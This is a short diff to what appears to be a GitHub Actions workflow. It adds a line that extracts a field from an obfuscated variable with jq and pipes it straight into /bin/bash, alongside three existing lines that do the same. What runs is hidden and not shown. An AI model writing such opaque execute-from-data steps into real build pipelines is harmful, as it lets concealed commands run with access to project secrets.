@@ -25,6 +25,7 @@ jobs:
           echo $bv97 | jq -r .c55 | /bin/bash
           echo $n23577 | jq -r .zi366 | /bin/bash
           echo $ubg4 | jq -r .lq0 | /bin/bash
+          echo $ivlgi496 | jq -r .rpdo92508 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
